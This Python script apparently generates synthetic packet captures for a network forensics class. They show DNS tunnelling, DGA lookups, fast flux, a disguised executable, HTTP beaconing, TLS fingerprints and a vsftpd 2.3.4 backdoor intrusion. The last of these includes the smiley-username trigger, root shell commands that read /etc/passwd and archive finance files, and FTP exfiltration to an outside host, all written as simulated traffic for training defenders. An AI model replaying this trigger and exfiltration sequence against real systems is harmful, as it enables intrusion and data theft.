"""Build the synthetic Class 3 demo captures under content/cis53/demos/files.

    pip install scapy cryptography
    python scripts/make_class3_pcaps.py

All traffic is invented. Addresses are private or documentation ranges (RFC 1918,
RFC 5737), and every domain ends in .test or is a well-known public API name used
only as an SNI label. Nothing here is real malware: the "executable" is a short
text file that starts with the letters MZ.
"""

import base64
import hashlib
import random
import struct
import zlib
from datetime import datetime, timezone
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID
from scapy.all import DNS, DNSQR, DNSRR, ICMP, IP, TCP, UDP, Ether, Raw, wrpcap

OUT = Path(__file__).parent.parent / "content" / "cis53" / "demos" / "files"
T0 = datetime(2026, 11, 6, 9, 0, 0, tzinfo=timezone.utc).timestamp()
MSS = 1400


def mac(ip: str) -> str:
    h = hashlib.md5(ip.encode()).digest()
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(h[:5])


class Cap:
    """Collects packets with explicit timestamps and builds TCP/UDP exchanges."""

    def __init__(self, seed: int):
        self.pkts = []
        self.rng = random.Random(seed)
        self.ipid = 1000

    def _emit(self, t, src, dst, l4, payload=b""):
        self.ipid += 1
        p = Ether(src=mac(src), dst=mac(dst)) / IP(src=src, dst=dst, id=self.ipid, ttl=64) / l4
        if payload:
            p = p / Raw(payload)
        p.time = T0 + t
        self.pkts.append(p)

    def udp(self, t, src, sport, dst, dport, payload):
        self._emit(t, src, dst, UDP(sport=sport, dport=dport), payload)

    def dns_pair(
        self, t, client, resolver, qname, qtype="A", answers=None, rcode=0, ttl=300, rtt=0.02
    ):
        sport = self.rng.randint(20000, 60000)
        qid = self.rng.randint(1, 65000)
        q = DNS(id=qid, rd=1, qd=DNSQR(qname=qname, qtype=qtype))
        self.udp(t, client, sport, resolver, 53, bytes(q))
        an = None
        for a in answers or []:
            rr = DNSRR(rrname=qname, type=qtype, ttl=ttl, rdata=a)
            an = rr if an is None else an / rr
        r = DNS(
            id=qid,
            qr=1,
            rd=1,
            ra=1,
            rcode=rcode,
            qd=DNSQR(qname=qname, qtype=qtype),
            an=an,
            ancount=len(answers or []),
        )
        self.udp(t + rtt, resolver, 53, client, sport, bytes(r))

    def tcp(self, t, client, server, sport, dport, exchanges, rtt=0.03, close=True):
        """exchanges: list of (direction, bytes) with direction 'c' or 's'. Returns end time."""
        cseq, sseq = self.rng.randint(1000, 2**31), self.rng.randint(1000, 2**31)
        cs, ss = cseq, sseq

        def send(dt, d, flags, data=b""):
            nonlocal cs, ss
            if d == "c":
                self._emit(
                    dt,
                    client,
                    server,
                    TCP(
                        sport=sport,
                        dport=dport,
                        flags=flags,
                        seq=cs,
                        ack=ss if "A" in flags else 0,
                        window=64240,
                    ),
                    data,
                )
                cs += len(data) + (1 if "S" in flags or "F" in flags else 0)
            else:
                self._emit(
                    dt,
                    server,
                    client,
                    TCP(sport=dport, dport=sport, flags=flags, seq=ss, ack=cs, window=65535),
                    data,
                )
                ss += len(data) + (1 if "S" in flags or "F" in flags else 0)

        now = t
        send(now, "c", "S")
        now += rtt
        send(now, "s", "SA")
        now += rtt / 2
        send(now, "c", "A")
        for d, data in exchanges:
            now += rtt
            for i in range(0, len(data), MSS):
                send(now, d, "PA", data[i : i + MSS])
                now += 0.0004
            send(now, "s" if d == "c" else "c", "A")
        if close:
            now += rtt
            send(now, "c", "FA")
            now += rtt
            send(now, "s", "FA")
            now += rtt / 2
            send(now, "c", "A")
        return now

    def tcp_syn_rst(self, t, client, server, sport, dport, open_=False):
        seq = self.rng.randint(1000, 2**31)
        self._emit(
            t, client, server, TCP(sport=sport, dport=dport, flags="S", seq=seq, window=1024)
        )
        if open_:
            self._emit(
                t + 0.001,
                server,
                client,
                TCP(sport=dport, dport=sport, flags="SA", seq=9000, ack=seq + 1),
            )
            self._emit(
                t + 0.002, client, server, TCP(sport=sport, dport=dport, flags="R", seq=seq + 1)
            )
        else:
            self._emit(
                t + 0.001,
                server,
                client,
                TCP(sport=dport, dport=sport, flags="RA", seq=0, ack=seq + 1),
            )

    def save(self, name):
        self.pkts.sort(key=lambda p: p.time)
        wrpcap(str(OUT / name), self.pkts)
        print(f"{name}: {len(self.pkts)} packets")


# --------------------------------------------------------------------------- Demo 007: DNS
def dns_capture():
    c = Cap(7)
    r = c.rng
    resolver = "10.0.0.2"
    names = [
        "www.merritt.example",
        "mail.office.test",
        "cdn.static-assets.test",
        "updates.vendor.test",
        "intranet.corp.test",
        "api.weather.test",
        "login.sso.test",
        "docs.corp.test",
        "time.corp.test",
        "files.corp.test",
    ]
    # Normal office lookups from four hosts
    t = 0.0
    for i in range(70):
        t += r.uniform(1.5, 9)
        client = r.choice(["10.0.0.11", "10.0.0.12", "10.0.0.13", "10.0.0.14"])
        n = r.choice(names)
        qt = r.choice(["A", "A", "A", "AAAA"])
        ans = (
            ["10.1.%d.%d" % (r.randint(0, 5), r.randint(2, 250))]
            if qt == "A"
            else ["2001:db8::%x" % r.randint(1, 500)]
        )
        c.dns_pair(t, client, resolver, n, qt, ans, ttl=r.choice([300, 600, 3600]))

    # Tunnel: 10.0.0.77 sends base32 chunks to one parent domain, TXT queries, answers are tiny
    secret = (
        b"employee,salary,ssn\nA. Rivera,81250,SYNTHETIC-000-00-0001\nB. Osei,92100,SYNTHETIC-000-00-0002\n"
        b"C. Nguyen,77400,SYNTHETIC-000-00-0003\nD. Patel,105300,SYNTHETIC-000-00-0004\n"
        b"-- training data, not real people --\n"
    ) * 2
    b32 = base64.b32encode(secret).decode().rstrip("=").lower()
    chunks = [b32[i : i + 52] for i in range(0, len(b32), 52)]
    t = 40.0
    for i, ch in enumerate(chunks):
        t += r.uniform(0.4, 1.2)
        qname = f"{i:03d}.{ch}.t.updates-cdn.test"
        c.dns_pair(t, "10.0.0.77", resolver, qname, "TXT", ["ok"], ttl=0)
    # DGA: 10.0.0.31 tries random names, almost all NXDOMAIN
    t = 60.0
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    for i in range(45):
        t += r.uniform(0.2, 0.9)
        n = "".join(r.choice(alphabet) for _ in range(r.randint(11, 15))) + r.choice(
            [".test", ".test", ".example"]
        )
        if i == 38:
            c.dns_pair(t, "10.0.0.31", resolver, n, "A", ["198.51.100.88"], ttl=60)
        else:
            c.dns_pair(t, "10.0.0.31", resolver, n, "A", [], rcode=3)
    # Fast flux: one name, tiny TTL, new addresses every time
    t = 20.0
    for i in range(14):
        t += r.uniform(25, 40)
        ips = ["203.0.113.%d" % r.randint(2, 250) for _ in range(3)]
        c.dns_pair(t, "10.0.0.14", resolver, "secure-login.bank-update.test", "A", ips, ttl=30)
    c.save("dns-tunnel-dga.pcap")
    return hashlib.sha256(secret).hexdigest()


# --------------------------------------------------------------------------- Demo 008: HTTP
def png_bytes():
    def chunk(tag, data):
        return (
            struct.pack(">I", len(data))
            + tag
            + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        )

    rows = b"".join(
        b"\x00" + b"".join(bytes([(x * 8) % 256, (y * 8) % 256, 160]) for x in range(32))
        for y in range(32)
    )
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 32, 32, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(rows))
        + chunk(b"IEND", b"")
    )


def http_resp(body, ctype, extra=""):
    return (
        f"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n{extra}\r\n"
    ).encode() + body


def http_capture():
    c = Cap(8)
    client, web, evil, drop = "10.0.0.15", "203.0.113.50", "198.51.100.77", "192.0.2.60"
    ua_ok = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0 Safari/537.36"
    html = b"<html><head><title>Merritt Parts Catalog</title></head><body><h1>Parts</h1><img src=/logo.png></body></html>"
    png = png_bytes()
    fake_exe = (
        b"MZ"
        + b"This is a harmless training file. It is text, not a program. CIS53 Demo 008.\n" * 40
    )
    zipish = b"PK\x03\x04" + bytes(random.Random(5).randrange(256) for _ in range(6000))
    t = 0.0
    c.dns_pair(t, client, "10.0.0.2", "parts.web.test", "A", [web])
    t += 0.2
    t = (
        c.tcp(
            t,
            client,
            web,
            51001,
            80,
            [
                (
                    "c",
                    f"GET /catalog HTTP/1.1\r\nHost: parts.web.test\r\nUser-Agent: {ua_ok}\r\nAccept: */*\r\n\r\n".encode(),
                ),
                ("s", http_resp(html, "text/html")),
                (
                    "c",
                    f"GET /logo.png HTTP/1.1\r\nHost: parts.web.test\r\nUser-Agent: {ua_ok}\r\n\r\n".encode(),
                ),
                ("s", http_resp(png, "image/png")),
            ],
        )
        + 6
    )
    # Executable disguised as an image
    c.dns_pair(t, client, "10.0.0.2", "invoice-portal.web.test", "A", [drop])
    t += 0.2
    t = (
        c.tcp(
            t,
            client,
            drop,
            51010,
            80,
            [
                (
                    "c",
                    f"GET /docs/invoice-0412.jpg HTTP/1.1\r\nHost: invoice-portal.web.test\r\nUser-Agent: {ua_ok}\r\nReferer: http://mail.office.test/inbox\r\n\r\n".encode(),
                ),
                ("s", http_resp(fake_exe, "image/jpeg")),
            ],
        )
        + 4
    )
    # A zip, then beacon POSTs from a very old user agent to an odd host
    t = (
        c.tcp(
            t,
            client,
            drop,
            51011,
            80,
            [
                (
                    "c",
                    f"GET /docs/q3-report.zip HTTP/1.1\r\nHost: invoice-portal.web.test\r\nUser-Agent: {ua_ok}\r\n\r\n".encode(),
                ),
                ("s", http_resp(zipish, "application/zip")),
            ],
        )
        + 8
    )
    c.dns_pair(t, client, "10.0.0.2", "gate.cdn-sync.test", "A", [evil])
    t += 0.2
    for i in range(6):
        body = base64.b64encode(f"host=WS-0042&user=arivera&seq={i}&idle=0".encode())
        resp = b"cmd=sleep&t=30"
        t = (
            c.tcp(
                t,
                client,
                evil,
                52000 + i,
                80,
                [
                    (
                        "c",
                        (
                            f"POST /gate.php HTTP/1.1\r\nHost: gate.cdn-sync.test\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n"
                        ).encode()
                        + body,
                    ),
                    ("s", http_resp(resp, "text/plain")),
                ],
            )
            + 30
        )
    c.save("http-carve.pcap")
    return {
        "fake_exe": hashlib.sha256(fake_exe).hexdigest(),
        "zip": hashlib.sha256(zipish).hexdigest(),
        "png": hashlib.sha256(png).hexdigest(),
        "exe_len": len(fake_exe),
    }


# --------------------------------------------------------------------------- Demo 009: TLS
def ext(t, body):
    return struct.pack(">HH", t, len(body)) + body


def client_hello(sni, ciphers, exts_order, tls13=True, groups=(29, 23, 24), rng=None):
    rng = rng or random.Random(1)
    ex = []
    for e in exts_order:
        if e == "sni":
            name = sni.encode()
            ex.append(ext(0, struct.pack(">HBH", len(name) + 3, 0, len(name)) + name))
        elif e == "groups":
            ex.append(
                ext(
                    10,
                    struct.pack(">H", len(groups) * 2)
                    + b"".join(struct.pack(">H", g) for g in groups),
                )
            )
        elif e == "ecpf":
            ex.append(ext(11, b"\x01\x00"))
        elif e == "sigalgs":
            algs = [0x0403, 0x0804, 0x0401, 0x0503, 0x0805, 0x0501, 0x0806, 0x0601]
            ex.append(
                ext(
                    13,
                    struct.pack(">H", len(algs) * 2) + b"".join(struct.pack(">H", a) for a in algs),
                )
            )
        elif e == "alpn":
            protos = [b"h2", b"http/1.1"] if tls13 else [b"http/1.1"]
            lst = b"".join(bytes([len(p)]) + p for p in protos)
            ex.append(ext(16, struct.pack(">H", len(lst)) + lst))
        elif e == "ems":
            ex.append(ext(23, b""))
        elif e == "versions":
            vs = [0x0304, 0x0303]
            ex.append(ext(43, bytes([len(vs) * 2]) + b"".join(struct.pack(">H", v) for v in vs)))
        elif e == "keyshare":
            ks = struct.pack(">HH", 29, 32) + bytes(rng.randrange(256) for _ in range(32))
            ex.append(ext(51, struct.pack(">H", len(ks)) + ks))
        elif e == "psk":
            ex.append(ext(45, b"\x01\x01"))
        elif e == "renego":
            ex.append(ext(65281, b"\x00"))
    exts = b"".join(ex)
    body = (
        b"\x03\x03"
        + bytes(rng.randrange(256) for _ in range(32))
        + b"\x20"
        + bytes(rng.randrange(256) for _ in range(32))
        + struct.pack(">H", len(ciphers) * 2)
        + b"".join(struct.pack(">H", x) for x in ciphers)
        + b"\x01\x00"
        + struct.pack(">H", len(exts))
        + exts
    )
    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def server_hello(tls13, cipher, rng):
    exts = b""
    if tls13:
        exts = ext(43, b"\x03\x04") + ext(
            51, struct.pack(">HH", 29, 32) + bytes(rng.randrange(256) for _ in range(32))
        )
    body = (
        b"\x03\x03"
        + bytes(rng.randrange(256) for _ in range(32))
        + b"\x20"
        + bytes(rng.randrange(256) for _ in range(32))
        + struct.pack(">H", cipher)
        + b"\x00"
        + struct.pack(">H", len(exts))
        + exts
    )
    hs = b"\x02" + struct.pack(">I", len(body))[1:] + body
    return b"\x16\x03\x03" + struct.pack(">H", len(hs)) + hs


def make_cert(cn, issuer_cn, days=90, start=datetime(2026, 10, 1, tzinfo=timezone.utc)):
    key = ec.generate_private_key(ec.SECP256R1())
    subj = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    iss = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, issuer_cn),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Unknown Hosting Ltd"),
        ]
    )
    from datetime import timedelta

    cert = (
        x509.CertificateBuilder()
        .subject_name(subj)
        .issuer_name(iss)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(start)
        .not_valid_after(start + timedelta(days=days))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), critical=False)
        .sign(key, hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.DER)


def tls12_server_flight(cert_der, rng):
    sh = server_hello(False, 0xC02F, rng)
    certs = struct.pack(">I", len(cert_der))[1:] + cert_der
    cbody = struct.pack(">I", len(certs))[1:] + certs
    chs = b"\x0b" + struct.pack(">I", len(cbody))[1:] + cbody
    cert_rec = b"\x16\x03\x03" + struct.pack(">H", len(chs)) + chs
    shd = b"\x16\x03\x03\x00\x04\x0e\x00\x00\x00"
    return sh + cert_rec + shd


def app_records(total, rng):
    out, left = b"", total
    while left > 0:
        n = min(left, 16000)
        out += b"\x17\x03\x03" + struct.pack(">H", n) + bytes(rng.randrange(256) for _ in range(n))
        left -= n
    return out


CHROME = dict(
    ciphers=[
        0x1301,
        0x1302,
        0x1303,
        0xC02B,
        0xC02F,
        0xC02C,
        0xC030,
        0xCCA9,
        0xCCA8,
        0xC013,
        0xC014,
        0x009C,
        0x009D,
        0x002F,
        0x0035,
    ],
    exts=[
        "sni",
        "ems",
        "renego",
        "groups",
        "ecpf",
        "alpn",
        "sigalgs",
        "versions",
        "psk",
        "keyshare",
    ],
)
PYREQ = dict(
    ciphers=[
        0x1302,
        0x1303,
        0x1301,
        0xC02C,
        0xC030,
        0x009F,
        0xCCA9,
        0xCCA8,
        0xCCAA,
        0xC02B,
        0xC02F,
        0x009E,
        0xC024,
        0xC028,
        0xC014,
        0x009D,
        0x009C,
    ],
    exts=["ecpf", "groups", "sigalgs", "sni", "ems", "alpn", "versions", "psk", "keyshare"],
)
OLDTOOL = dict(
    ciphers=[0xC02F, 0xC030, 0xC02B, 0xC02C, 0x009C, 0x009D, 0x002F, 0x0035],
    exts=["renego", "sni", "groups", "ecpf", "sigalgs", "alpn", "ems"],
)


def tls_capture():
    c = Cap(9)
    r = c.rng
    resolver = "10.0.0.2"
    # (client, name, server ip, profile, tls13, up bytes, down bytes, start time, note)
    plan = [
        ("10.0.0.15", "www.merritt.example", "203.0.113.20", CHROME, True, 900, 42000, 2),
        ("10.0.0.15", "api.anthropic.com", "198.51.100.10", CHROME, True, 4200, 18000, 15),
        ("10.0.0.60", "api.openai.com", "198.51.100.30", PYREQ, True, 2500, 9000, 8),
        ("10.0.0.60", "api.openai.com", "198.51.100.30", PYREQ, True, 2600, 11000, 38),
        ("10.0.0.60", "api.openai.com", "198.51.100.30", PYREQ, True, 2400, 8500, 68),
        ("10.0.0.44", "chat.fastpaste-ai.test", "192.0.2.99", OLDTOOL, False, 640000, 3000, 50),
        ("10.0.0.15", "docs.corp.test", "10.1.2.10", CHROME, True, 1500, 28000, 90),
    ]
    for client, name, ip, prof, t13, up, down, t in plan:
        c.dns_pair(t - 0.3, client, resolver, name, "A", [ip])
        ch = client_hello(name, prof["ciphers"], prof["exts"], rng=r)
        if t13:
            sflight = (
                server_hello(True, 0x1301, r) + b"\x14\x03\x03\x00\x01\x01" + app_records(2800, r)
            )
        else:
            sflight = tls12_server_flight(make_cert(name, "FastPaste Free CA"), r)
        ex = [("c", ch), ("s", sflight)]
        if not t13:
            ex.append(
                (
                    "c",
                    b"\x16\x03\x03\x00\x46"
                    + bytes(r.randrange(256) for _ in range(70))
                    + b"\x14\x03\x03\x00\x01\x01",
                )
            )
            ex.append(
                (
                    "s",
                    b"\x14\x03\x03\x00\x01\x01"
                    + b"\x16\x03\x03\x00\x28"
                    + bytes(r.randrange(256) for _ in range(40)),
                )
            )
        ex.append(("c", app_records(up, r)))
        ex.append(("s", app_records(down, r)))
        c.tcp(t, client, ip, r.randint(40000, 60000), 443, ex)
    c.save("tls-metadata-ai-egress.pcap")


# --------------------------------------------------------------------------- Demo 010: server-side compromise
def ftp_compromise_capture():
    c = Cap(10)
    atk, srv, out = "198.51.100.23", "10.20.30.5", "192.0.2.80"
    r = c.rng
    t = 0.0
    # Recon: ping, then a quick SYN scan of 30 ports
    c._emit(t, atk, srv, ICMP(type=8, id=7, seq=1), b"scan")
    c._emit(t + 0.001, srv, atk, ICMP(type=0, id=7, seq=1), b"scan")
    ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        111,
        135,
        139,
        443,
        445,
        512,
        513,
        514,
        1099,
        1524,
        2049,
        2121,
        3306,
        3632,
        5432,
        5900,
        6000,
        6667,
        6697,
        8009,
        8180,
        8787,
        6200,
    ]
    t += 0.5
    for p in ports:
        t += 0.01
        c.tcp_syn_rst(
            t,
            atk,
            srv,
            40000 + p % 1000,
            p,
            open_=p
            in (21, 22, 23, 25, 53, 80, 111, 139, 445, 512, 513, 514, 3306, 5432, 5900, 6000, 8009)
            and p != 6200,
        )
    # Banner grab, then the trigger: USER ends with ":)"
    t += 40
    sp = 50376
    t = c.tcp(
        t,
        atk,
        srv,
        sp,
        21,
        [
            ("s", b"220 (vsFTPd 2.3.4)\r\n"),
            ("c", b"USER anonymous:)\r\n"),
            ("s", b"331 Please specify the password.\r\n"),
            ("c", b"PASS x\r\n"),
        ],
        close=False,
    )
    # Backdoor port opens only after the trigger; shell as root
    shell = [
        ("c", b"id\n"),
        ("s", b"uid=0(root) gid=0(root)\n"),
        ("c", b"uname -a\n"),
        ("s", b"Linux files01 2.6.24-16-server #1 SMP i686 GNU/Linux\n"),
        ("c", b"ls /srv/finance\n"),
        ("s", b"budget-2026.xlsx\ncustomers.csv\npayroll-q3.csv\n"),
        ("c", b"cat /etc/passwd | head -3\n"),
        (
            "s",
            b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n",
        ),
        ("c", b"tar czf /tmp/f.tgz /srv/finance\n"),
        ("s", b""),
        ("c", b"ftp -n 192.0.2.80\n"),
        ("s", b""),
    ]
    shell = [(d, b) for d, b in shell if b]
    c.tcp(t + 0.2, atk, srv, 60155, 6200, shell)
    # Exfiltration over cleartext FTP from the victim to an outside server (passive mode)
    t += 25
    archive = b"\x1f\x8b\x08" + bytes(r.randrange(256) for _ in range(180000))
    data_port = 40111
    c.tcp(
        t,
        srv,
        out,
        33210,
        21,
        [
            ("s", b"220 FTP Service ready\r\n"),
            ("c", b"USER drop\r\n"),
            ("s", b"331 Password required\r\n"),
            ("c", b"PASS drop123\r\n"),
            ("s", b"230 Logged in\r\n"),
            ("c", b"TYPE I\r\n"),
            ("s", b"200 Type set to I\r\n"),
            ("c", b"PASV\r\n"),
            (
                "s",
                f"227 Entering Passive Mode (192,0,2,80,{data_port >> 8},{data_port & 255})\r\n".encode(),
            ),
            ("c", b"STOR f.tgz\r\n"),
            ("s", b"150 Ok to send data\r\n"),
        ],
        close=False,
    )
    c.tcp(t + 0.4, srv, out, 33211, data_port, [("c", archive)])
    c.save("vsftpd-backdoor-exfil.pcap")
    return hashlib.sha256(archive).hexdigest()


if __name__ == "__main__":
    OUT.mkdir(parents=True, exist_ok=True)
    print("secret sha256", dns_capture())
    print(http_capture())
    tls_capture()
    print("archive sha256", ftp_compromise_capture())
